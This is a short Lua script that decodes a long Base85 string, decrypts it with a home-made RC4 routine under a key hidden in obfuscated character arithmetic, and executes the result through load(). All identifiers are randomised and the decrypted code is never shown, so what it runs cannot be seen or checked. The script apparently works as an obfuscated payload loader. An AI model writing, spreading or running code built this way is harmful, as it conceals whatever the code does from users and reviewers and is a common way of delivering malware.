local pb_str = "!9*LB5<7|G1hHgTM5tsU9k`Ql=R*9ZU<Ik+pv-@u{6%9HTI{PL9gmqPkH#V{5f?<(rt;D#1=?Q7`~LdyuoFB^4dPw@_+n8k1>`OYke{=f9^R)QS_a)El3As;2&ngw8QhYu`v2ZWHE^O|2Hix;KN3qcD?LTh>W0^KQVpz!-n1LthO@{@$P!RQvvg?-2^>d<vhi*C1#LSNoi05=-6_?+M|B9)u+~EHzoxndoxbg(RdQMEtg$#lA3Cw^F4fmQv6r+&0tDxVITQywmX%XL?#!d#HugrxgrAQsA>=|MK}JHE2=Hq)KM+X~0RHj?R0*B=K|@y!UhYy%foR2Z>-W`r#-;_K3##QOCFXocV8+JeCv~!$tU8_?2Ox}2Djd1lf7+o9i*9?nyc;=S{x$KVW=kc;2!)ezERohiX{XkvzhwA6$!%euxz=trfR`~|etbms6TO@m(2LWDM-E$ytIPJI5wU~;m&_R3NEQ*DQ!a#AmekC=(C+S7symgA0VL@GU--ew(ue8*$Xis=NkOYS957K~hT!hOHF;PV;G0!SkSrm3cDTY-uXPe;B=k)UlB74%i8gWx@F()-<mQ}d_IK7Br>~k3BFYuS18FRTTrf2Vwm{eBkAy8lapkypEfcQlzGxVW{EBMZ;!ai12bse}$-OCumEJaFwC4)xF6d;=b=nHApGpdsKAR^l)Z)gnExnyxM45PqtL>bAr^hhCDqD+@6ifytt?r9d&E%(a6Vx_8>WF~9M{jNmAs<NJy8%U4i41fx+g~7&Z=)3)9UaoHFd}n1ddH3Z-4W$~sP!bO{^MQW?LTVrj2mihEaMh$TyV8d;A_o8P-jWUC|${mScKFjJCcPtQ$NyIhw+J6v9#h^U&EF3uZzuqdW4{rUexz>vpeAh0x8TLz=AS%s=6?H-G$hcqI#G<+5"

local LVskcyaS = string.char(52+32,122-19,95-26,101+19,31+23,92+15,78+35,113-40,70+28,83+30,140-20,147-30,84-32,123-18,138-28,119-39,113-36,139-31,20+45,43+41,104-29,84-18,94-16,90+24,144-29,38+35,58+18,76+32,107-39,144-40,106-33,83-16)
local function GDGvVnvs(a,b)
    local p,c=1,0
    while a>0 and b>0 do
        local ra,rb=a%2,b%2
        if ra~=rb then c=c+p end
        a,b,p=(a-ra)/2,(b-rb)/2,p*2
    end
    if a<b then a=b end
    while a>0 do
        local ra=a%2 if ra>0 then c=c+p end a,p=(a-ra)/2,p*2
    end
    return c
end
local function YUpUGMWd(s)
    local m,o,p,v,n,c={},{},{52200625,614125,7225,85,1},0,0,"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)]=i-1 end
    for i=1,#s do
        local x=m[string.byte(s,i)]
        if x then
            v=v+x*p[n+1] n=n+1
            if n==5 then
                table.insert(o,string.char(math.floor(v/16777216),math.floor((v%16777216)/65536),math.floor((v%65536)/256),v%256))
                v,n=0,0
            end
        end
    end
    return table.concat(o)
end
local function KKiWeNSp(d,k)
    local s={} for i=0,255 do s[i]=i end
    local j=0
    for i=0,255 do j=(j+s[i]+string.byte(k,(i%#k)+1))%256 s[i],s[j]=s[j],s[i] end
    local i,out=0,{} j=0
    for idx=1,#d do
        i=(i+1)%256 j=(j+s[i])%256 s[i],s[j]=s[j],s[i]
        out[#out+1]=string.char(GDGvVnvs(string.byte(d,idx),s[(s[i]+s[j])%256]))
    end
    return table.concat(out)
end
local p_data = KKiWeNSp(YUpUGMWd(pb_str), LVskcyaS)
assert(load(p_data))()
